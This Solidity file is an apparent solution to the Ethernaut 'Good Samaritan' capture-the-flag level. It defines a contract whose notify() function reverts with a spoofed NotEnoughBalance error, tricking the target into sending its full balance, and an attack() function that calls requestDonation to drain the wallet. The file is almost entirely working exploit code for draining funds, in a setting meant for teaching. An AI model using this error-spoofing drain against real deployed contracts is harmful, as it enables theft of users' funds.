// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/**
 * @title 27. GOOD SAMARITAN
 * @dev Drain all the balance from the good samaritan wallet.
 */

interface INotifyable {
    function notify(uint256 amount) external;
}

interface IGoodOldSama {
    function coin() external returns (address);

    function wallet() external returns (address);

    function requestDonation() external returns (bool);
}

interface ICoin {
    function balances(address user) external view returns (uint256);
}

contract ThanksForTheNotif {
    IGoodOldSama private goodOldSama =
        IGoodOldSama(0x19bd36accED359007B00Baf460Eb07045c3396BD);
    ICoin private coin = ICoin(goodOldSama.coin());
    address private wallet = goodOldSama.wallet();

    error NotEnoughBalance();

    function notify(uint256 amount) public pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function attack() public {
        goodOldSama.requestDonation();
        require(coin.balances(wallet) == 0, "Attack failed!");
    }
}

// 🎉 Level completed! 🎉
